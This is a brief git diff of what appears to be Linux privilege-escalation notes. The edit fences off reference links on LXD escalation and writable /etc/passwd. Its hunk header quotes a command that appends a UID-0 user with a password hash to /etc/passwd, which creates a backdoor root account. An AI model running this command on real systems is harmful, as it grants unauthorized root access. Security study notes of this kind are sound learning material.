@@ -210,8 +210,10 @@ echo 'user:$1$user$nY3qj2koDQU1.5HG4ZTj9/:0:0:User:/root:/bin/bash' >>/etc/passw
 
 ## References
 
+```
 https://rioasmara.com/2021/01/29/privilege-escalation-with-lxd/
 
 https://www.hackingarticles.in/lxd-privilege-escalation/
 
 https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-etc-passwd
+```
